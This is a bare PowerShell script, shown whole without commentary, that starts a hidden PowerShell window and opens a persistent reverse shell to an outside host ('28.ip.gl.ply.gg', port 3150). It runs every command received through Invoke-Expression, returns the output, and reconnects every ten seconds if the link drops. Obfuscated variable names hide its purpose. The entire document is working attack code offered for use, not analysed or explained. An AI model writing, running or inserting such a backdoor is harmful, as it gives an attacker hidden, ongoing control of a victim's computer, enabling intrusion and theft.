Start-Process $PSHOME\powershell.exe -ArgumentList {
  while ($true) {
    try {
      $a1b2c3d4e5f6g7h8i9j0 = New-Object Net.Sockets.TCPClient('28.ip.gl.ply.gg', 3150);
      $k1l2m3n4o5p6q7r8s9t0 = $a1b2c3d4e5f6g7h8i9j0.GetStream();
      $u1v2w3x4y5z6a7b8c9d0 = New-Object IO.StreamWriter($k1l2m3n4o5p6q7r8s9t0);
      [byte[]]$e1f2g3h4i5j6k7l8m9n0 = 0..$a1b2c3d4e5f6g7h8i9j0.ReceiveBufferSize | % {0};

      function x1y2z3a4b5c6d7e8f9g0 ($o1p2q3r4s5t6u7v8w9x0) {
        $u1v2w3x4y5z6a7b8c9d0.Write($o1p2q3r4s5t6u7v8w9x0);
        $u1v2w3x4y5z6a7b8c9d0.Flush()
      }

      x1y2z3a4b5c6d7e8f9g0 '';

      while (($y1z2a3b4c5d6e7f8g9h0 = $k1l2m3n4o5p6q7r8s9t0.Read($e1f2g3h4i5j6k7l8m9n0, 0, $e1f2g3h4i5j6k7l8m9n0.Length)) -gt 0) {
        $i1j2k3l4m5n6o7p8q9r0 = ([text.encoding]::UTF8).GetString($e1f2g3h4i5j6k7l8m9n0, 0, $y1z2a3b4c5d6e7f8g9h0 - 1);
        $s1t2u3v4w5x6y7z8a9b0 = try {
          Invoke-Expression $i1j2k3l4m5n6o7p8q9r0 2>&1 | Out-String
        } catch {
          $_ | Out-String
        }
        x1y2z3a4b5c6d7e8f9g0 ($s1t2u3v4w5x6y7z8a9b0)
      }

      $u1v2w3x4y5z6a7b8c9d0.Close()
      $a1b2c3d4e5f6g7h8i9j0.Close()
    }
    catch {
      # Connection failed or dropped, wait 10 seconds before retrying
      Start-Sleep -Seconds 10
    }
  }
} -WindowStyle Hidden























